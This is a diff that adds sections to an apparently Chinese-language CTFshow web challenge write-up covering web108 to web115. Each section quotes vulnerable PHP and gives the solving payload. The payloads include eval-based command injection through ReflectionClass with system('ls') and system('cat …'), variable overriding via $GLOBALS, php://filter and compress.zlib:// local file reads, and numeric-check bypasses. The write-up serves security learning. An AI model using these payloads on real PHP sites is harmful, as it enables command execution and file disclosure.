@@ -1,9 +1,3 @@
-
-
-
-
-
-
 # CTFSHOW-WEB入门
 
 ## 一、信息收集
@@ -4533,9 +4527,346 @@ intval()
 
 0x36d的十进制为877，
 
-我们需要字母在前来跳过if语句，接着再进行字符串的反转得到877a
+对877a进行字符串的反转得到a778
 
 intval()函数取整数部分得到877
 
 payload
 
+```
+?c=a%00778
+```
+
+得到flag
+
+![image-20240512120350436](image/image-20240512120350436.png)
+
+---
+
+### web109
+
+```php
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
+            eval("echo new $v1($v2());");
+    }
+
+}
+
+?> 
+```
+
+这里传入两个参数，v1和v2
+
+两个参数都要传入字母，然后需要执行echo new $v1($v2());
+
+也就是建立一个反射类，就像101题提到的
+
+建立new ReflectionClass
+
+```
+Exception 
+处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类
+
+ReflectionClass 或者 ReflectionMethod 
+都为常用的反射类，可以理解为一个类的映射
+```
+
+这三个都是可以用的
+
+payload
+
+```
+?v1=ReflectionClass&v2=system('ls')
+
+?v1=ReflectionClass&v2=system('cat fl36dg.txt')
+```
+
+得到flag
+
+![image-20240512121922191](image/image-20240512121922191.png)
+
+---
+
+### web110
+
+```php
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
+            die("error v1");
+    }
+    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
+            die("error v2");
+    }
+
+    eval("echo new $v1($v2());");
+
+}
+
+?> 
+```
+
+这里正则进行了匹配，不能存在符号，所以就不能再用上题的方法
+
+我们可以使用FilesystemIterator文件系统迭代器来进行利用，
+
+![image-20240512122606597](image/image-20240512122606597.png)
+
+通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构
+
+![image-20240512122807219](image/image-20240512122807219.png)
+
+payload
+
+```
+?v1=FilesystemIterator&v2=getcwd  //得到文件名
+```
+
+直接访问fl36dga.txt得到flag
+
+![image-20240512123108324](image/image-20240512123108324.png)
+
+---
+
+### web111
+
+```php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+
+function getFlag(&$v1,&$v2){
+    eval("$$v1 = &$$v2;");
+    var_dump($$v1);
+}
+
+
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
+            die("error v1");
+    }
+    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
+            die("error v2");
+    }
+    
+    if(preg_match('/ctfshow/', $v1)){
+            getFlag($v1,$v2);
+    }
+    
+
+}
+
+?> 
+```
+
+这题用了一个变量覆盖，v1要有ctfshow
+
+然后执行getflag函数
+
+会把v2的地址传给v1，接着再输出v1
+
+从而调用全局变量GLOBALS
+
+```
+$GLOBALS
+
+引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
+```
+
+payload
+
+```
+?v1=ctfshow&v2=GLOBALS
+```
+
+得到flag
+
+![image-20240512124334598](image/image-20240512124334598.png)
+
+### web112
+
+```php
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($file){
+    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
+        die("hacker!");
+    }else{
+        return $file;
+    }
+}
+$file=$_GET['file'];
+if(! is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+} 
+```
+
+简单介绍一下函数
+
+is_file() 
+函数检查指定的文件名是否是正常的文件
+
+![image-20240512124936469](image/image-20240512124936469.png)
+
+filter() 
+函数用于对来自非安全来源的数据（比如用户输入）进行验证和过滤
+
+绕过正则才能执行highlight_file语句来读取flag文件，
+
+我们使用php伪协议
+
+payload
+
+```
+?file=php://filter/resource=flag.php
+```
+
+得到flag
+
+![image-20240512125718002](image/image-20240512125718002.png)
+
+---
+
+### web113
+
+```php
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($file){
+    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
+        die('hacker!');
+    }else{
+        return $file;
+    }
+}
+$file=$_GET['file'];
+if(! is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+}
+```
+
+比上一题多过滤了filter
+
+我们换一个伪协议
+
+压缩流zlib://
+
+![image-20240512130600318](image/image-20240512130600318.png)
+
+payload
+
+```
+?file=compress.zlib://flag.php
+```
+
+得到flag
+
+![image-20240512130643009](image/image-20240512130643009.png)
+
+---
+
+### web114
+
+```php
+
+error_reporting(0);
+highlight_file(__FILE__);
+function filter($file){
+    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
+        die('hacker!');
+    }else{
+        return $file;
+    }
+}
+$file=$_GET['file'];
+echo "师傅们居然tql都是非预期 哼！";
+if(! is_file($file)){
+    highlight_file(filter($file));
+}else{
+    echo "hacker!";
+}
+```
+
+禁用了compress
+
+但是没有禁用filter
+
+可以继续用filter伪协议
+
+payload
+
+```
+?file=php://filter/resource=flag.php
+```
+
+得到flag
+
+![image-20240512131231654](image/image-20240512131231654.png)
+
+---
+
+### web115
+
+```php
+include('flag.php');
+highlight_file(__FILE__);
+error_reporting(0);
+function filter($num){
+    $num=str_replace("0x","1",$num);
+    $num=str_replace("0","1",$num);
+    $num=str_replace(".","1",$num);
+    $num=str_replace("e","1",$num);
+    $num=str_replace("+","1",$num);
+    return $num;
+}
+$num=$_GET['num'];
+if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
+    if($num=='36'){
+        echo $flag;
+    }else{
+        echo "hacker!!";
+    }
+}else{
+    echo "hacker!!!";
+}
+```
+
+新函数str_replace
+
+![image-20240512131928229](image/image-20240512131928229.png)
+
+进行字符替换，不能出现0，0x，e，.和+
+
+trim($num)移除字符串两侧的字符不能等于36
+
+![image-20240512140405684](image/image-20240512140405684.png)
+
+发现无法去除分页符%0c
+
+payload
+
+```
+?num=%0c36
+```
+
+得到flag
+
+![image-20240512140557554](image/image-20240512140557554.png)
